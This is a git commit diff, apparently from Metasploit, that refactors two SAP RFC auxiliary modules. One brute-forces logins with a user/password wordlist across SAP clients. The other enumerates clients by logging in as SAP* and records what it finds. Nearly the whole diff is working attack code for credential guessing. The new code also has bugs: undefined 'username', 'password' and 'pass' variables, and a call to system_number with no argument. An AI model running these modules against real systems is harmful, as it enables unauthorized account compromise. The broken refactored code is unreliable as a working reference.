988bfa0a9f20ffe858e314c487c16880f043575e
Meatballs <eat_meatballs@hotmail.co.uk>
2014-05-12 23:36:08 +0100

    Initial refactoring to lib

--- modules/auxiliary/scanner/sap/sap_rfc_brute_login.rb
+++ modules/auxiliary/scanner/sap/sap_rfc_brute_login.rb
@@ -10,6 +10,7 @@
 ##
 
 require 'msf/core'
+require 'msf/core/exploit/sap'
 
 class Metasploit4 < Msf::Auxiliary
 
@@ -32,104 +33,98 @@ class Metasploit4 < Msf::Auxiliary
       'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
       'Author'         => ['nmonkee'],
       'License'        => BSD_LICENSE
-      )
+    )
 
-      register_options(
-      [
-        Opt::RPORT(3342),
-        OptString.new('CLIENT', [true, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
-        OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
-        OptString.new('SRPORT', [false, 'SAP Router Port Number', nil]),
-        OptPath.new('USERPASS_FILE', [ false, "File containing users and passwords separated by space, one pair per line",
-           File.join(Msf::Config.data_directory, "wordlists", "sap_rfc_common.txt") ])
-      ], self.class)
-    end
-
-  def run_host(ip)
-
-    $success = false
-
-    $saptbl = Msf::Ui::Console::Table.new(
-              Msf::Ui::Console::Table::Style::Default,
-              'Header'  => "[SAP] Credentials",
-              'Prefix'  => "\n",
-              'Postfix' => "\n",
-              'Indent'  => 1,
-              'Columns' =>
-                          [
-                           "host",
-                           "port",
-                           "client",
-                           "user",
-                           "pass",
-                           "status"
-                          ])
-
-     client_list.each do |client|
-       each_user_pass do |user, pass|
-         brute_user(user,client,pass,datastore['rhost'],datastore['rport'],system_number)
-       end
-     end
-
-     if $success
-       print($saptbl.to_s)
-       return
-     end
-   end
-
-   def brute_user(user, client, pass, rhost, rport, sysnr)
-   ashost = rhost
-
-  if datastore['SRHOST']
-#    if datastore['SRPORT']
-      ashost = "/H/#{datastore['SRHOST']}/H/#{rhost}"
-#    end
+    register_options(
+    [
+      Opt::RPORT(3342),
+      OptPath.new('USERPASS_FILE', [ false, "File containing users and passwords separated by space, one pair per line",
+          File.join(Msf::Config.data_directory, "wordlists", "sap_rfc_common.txt") ])
+    ], self.class)
   end
 
-   print_status("#{rhost}:#{rport} [SAP] Trying client: '#{client}'")
+  def run_host(ip)
+    rhost = datastore['RHOST']
+    rport = datastore['RPORT']
 
-   begin
-     auth_hash = {"user" => user, "passwd" => pass, "client" => client, "ashost" => ashost, "sysnr" => sysnr}
-     conn = Connection.new(auth_hash)
-   rescue NWError => e
-    vprint_error("#{rhost}:#{rport} [SAP] login failed - credentials incorrect for client: #{client} username: #{user} password: #{pass}") if e.message =~ /Name or password is incorrect/
-    vprint_error("#{rhost}:#{rport} [SAP] login failed - client #{client} does not exist") if e.message =~ /not available in this system/
-    vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (refused)") if e.message =~ /Connection refused/
-    vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (unreachable)") if e.message =~ /No route to host/
-    vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (hostname unknown)") if e.message =~ /unknown/
-     $saptbl << [rhost, rport, client, user, pass, 'pass change'] if e.message =~ /Password must be changed/
-     $saptbl << [rhost, rport, client, user, pass, 'locked'] if e.message =~ /Password logon no longer possible - too many failed attempts/
-     return
-   end
+    saptbl = Msf::Ui::Console::Table.new(
+              Msf::Ui::Console::Table::Style::Default,
+              'Header'  => "[SAP] Credentials #{rhost}:#{rport}",
+              'Columns' =>
+                [
+                  "host",
+                  "port",
+                  "client",
+                  "user",
+                  "pass",
+                  "status"
+                ])
 
-   begin
-     conn.connection_info
-     $saptbl << [rhost, rport, client, user, pass, '']
-     $success = true
-   rescue
-     print_error("#{rhost}:#{rport} [SAP] something went wrong :(")
-     return
-   end
-
-   conn.disconnect
-
-   $success = true
-
-   if $success
-     report_auth_info(
-                      :host => rhost,
-                      :sname => 'sap-gateway',
-                      :proto => 'tcp',
-                      :port => rport,
-                      :client => client,
-                      :user => user,
-                      :pass => pass,
-                      :sysnr => sysnr,
-                      :source_type => "user_supplied",
-                      :target_host => rhost,
-                      :target_port => rport
-                     )
+    client_list.each do |client|
+      print_status("#{rhost}:#{rport} [SAP] Trying client: #{client}")
+      each_user_pass do |user, password|
+        status = brute_user(user,
+                              client,
+                              password,
+                              rhost,
+                              rport)
+        if status
+          saptbl << [rhost, rport, client, user, password, status]
+          report_auth_info(
+            :host => rhost,
+            :sname => 'sap-gateway',
+            :proto => 'tcp',
+            :port => rport,
+            :client => client,
+            :user => user,
+            :pass => pass,
+            :sysnr => system_number,
+            :source_type => "user_supplied",
+            :target_host => rhost,
+            :target_port => rport
+          )
+        end
+      end
     end
+
+    if saptbl.rows.count > 0
+      print(saptbl.to_s)
+    end
+  end
+
+  def brute_user(user, client, pass, rhost, rport)
+    begin
+      status, conn = login(rhost, rport, client, username, password)
+      conn.connection_info
+      return ''
+    rescue NWError => e
+      case e.code
+      when :RFC_OK
+        return ''
+      when /Name or password is incorrect/i
+        vprint_error("#{rhost}:#{rport} [SAP] login failed - credentials incorrect for client: #{client} username: #{user} password: #{pass}")
+      when /not available in this system/i
+        vprint_error("#{rhost}:#{rport} [SAP] login failed - client #{client} does not exist")
+      when /Connection refused/i
+        vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (refused)")
+      when /No route to host/i
+        vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (unreachable)")
+      when /Gateway not connected to local/i
+        vprint_error("#{rhost}:#{rport} [SAP] login failed - gateway not configured")
+      when /unknown/i
+        vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (hostname unknown)")
+      when /Password must be changed/i
+        return 'pass change'
+      when /Password logon no longer possible - too many failed attempts/i
+        return 'locked'
+      end
+    ensure
+      if conn
+        conn.disconnect
+      end
+    end
+
+    nil
   end
 end
 
--- modules/auxiliary/scanner/sap/sap_rfc_client_enum.rb
+++ modules/auxiliary/scanner/sap/sap_rfc_client_enum.rb
@@ -10,18 +10,13 @@
 ##
 
 require 'msf/core'
-require 'rubygems'
-begin
-  require 'nwrfc'
-rescue LoadError
-  abort("[x] This module requires the NW RFC SDK ruby wrapper (http://rubygems.org/gems/nwrfc) from Martin Ceronio.")
-end
+require 'msf/core/exploit/sap'
 
 class Metasploit4 < Msf::Auxiliary
 
+  include Msf::Exploit::SAP
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
-  include NWRFC
 
   def initialize
     super(
@@ -32,107 +27,74 @@ class Metasploit4 < Msf::Auxiliary
                        This module can execute through a SAP Router if SRHOST and SRPORT values are set.
                        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
                     },
-          'References'  => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
-          'Author'      => [ 'nmonkee' ],
-          'License'     => BSD_LICENSE
-          )
+        'References'  => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
+        'Author'      => [ 'nmonkee' ],
+        'License'     => BSD_LICENSE
+    )
 
-  register_options(
-       [
-             Opt::RPORT(3342),
-             OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
-             OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
-             OptString.new('SRPORT', [false, 'SAP Router Port Number', nil]),
-           ], self.class)
+        register_options(
+          [
+            Opt::RPORT(3342),
+          ], self.class)
   end
 
-  def run_host(ip)
+  def run_host(rhost)
     user = "SAP*"
-    pass = Rex::Text.rand_text_alpha(8)
+    password = Rex::Text.rand_text_alpha(8)
+    rport = datastore['RPORT']
 
-    if datastore['CLIENT'].nil?
-      print_status("Using default SAP client list")
-      client = ['000', '001', '066']
-    else
-      if datastore['CLIENT'] =~ /^\d{3},/
-        client = datastore['CLIENT'].split(/,/)
-        print_status("Brute forcing clients #{datastore['CLIENT']}")
-      elsif
-        datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
-        array = datastore['CLIENT'].split(/-/)
-        client = (array.at(0)..array.at(1)).to_a
-        print_status("Brute forcing clients #{datastore['CLIENT']}")
-      elsif
-        datastore['CLIENT'] =~ /^\d{3}\z/
-        client = datastore['CLIENT']
-        print_status("Brute forcing client #{datastore['CLIENT']}")
-      else
-        print_status("Invalid CLIENT - using default SAP client list instead")
-        client = ['000', '001', '066']
-      end
-    end
+    saptbl = Msf::Ui::Console::Table.new(
+              Msf::Ui::Console::Table::Style::Default,
+              'Header'  => "[SAP] Clients #{rhost}:#{rport}",
+              'Columns' =>
+                [
+                  "host",
+                  "port",
+                  "client",
+                ])
 
-    sysnr = datastore['RPORT'].to_s[-2..-1]
-
-    client.each do |cli|
+    client_list.each do |client|
+      vprint_status("#{rhost}:#{rport} [SAP] trying client: #{client}")
       begin
-        enum_client(user,cli,pass,datastore['rhost'],datastore['rport'],sysnr)
-      rescue NWError
-        break
+        conn = login(rhost, rport, client, user, password)
+        print_good("#{rhost}:#{rport} [SAP] client found: #{client}")
+        saptbl << [rhost, rport, client]
+        report_auth_info(
+          :host          => rhost,
+          :sname         => 'sap-gateway',
+          :proto         => 'tcp',
+          :port          => rport,
+          :client        => client,
+          :user          => user,
+          :pass          => password,
+          :sysnr         => system_number(rport),
+          :source_type   => 'user_supplied',
+          :target_host   => rhost,
+          :target_port   => rport
+        )
+
+      rescue NWError => e
+        case e.message.to_s
+        when /not available in this system/i
+          vprint_error("#{rhost}:#{rport} [SAP] client #{client} does not exist")
+        when /Logon not possible/i
+          vprint_error("#{rhost}:#{rport} [SAP] client #{client} does not exist")
+        when /Gateway not connected to local/i
+          vprint_error("#{rhost}:#{rport} [SAP] Gateway not configured")
+          break
+        when /Connection refused/i
+          vprint_error("#{rhost}:#{rport} [SAP] client #{client} connection refused")
+          break
+        end
+      ensure
+        if conn
+          conn.disconnect
+        end
       end
     end
-  end
 
-  def enum_client(user, client, pass, rhost, rport, sysnr)
-
-  vprint_status("#{rhost}:#{rport} [SAP] Trying client: '#{client}'")
-
-  success = false
-
-  ashost = rhost
-
-  if datastore['SRHOST']
-#    if datastore['SRPORT']
-      ashost = "/H/#{datastore['SRHOST']}/H/#{rhost}"
-#    end
-  end
-
-  begin
-    auth_hash = {"user" => user, "passwd" => pass, "client" => client, "ashost" => ashost, "sysnr" => sysnr}
-    Connection.new(auth_hash)
-  rescue NWError => e
-    case e.message.to_s
-    when /not available in this system/i
-      vprint_error("#{rhost}:#{rport} [SAP] client #{client} does not exist")
-    when /Logon not possible/i
-      vprint_error("#{rhost}:#{rport} [SAP] client #{client} does not exist")
-    when /Gateway not connected to local/i
-      vprint_error("#{rhost}:#{rport} [SAP] Gateway not configured")
-      raise e
-    when /Connection refused/i
-      vprint_error("#{rhost}:#{rport} [SAP] client #{client} connection refused")
-      raise e
-    else
-      success = true
-    end
-  end
-
-    if success
-      print_good("#{rhost}:#{rport} [SAP] client found - #{client}")
-      report_auth_info(
-                     :host          => rhost,
-                     :sname         => 'sap-gateway',
-                     :proto         => 'tcp',
-                     :port          => rport,
-                     :client        => client,
-                     :user          => user,
-                     :pass          => pass,
-                     :sysnr         => sysnr,
-                     :source_type   => 'user_supplied',
-                     :target_host   => rhost,
-                     :target_port   => rport
-                      )
-      return
+    if saptbl.rows.count > 0
+      print(saptbl.to_s)
     end
   end
 end
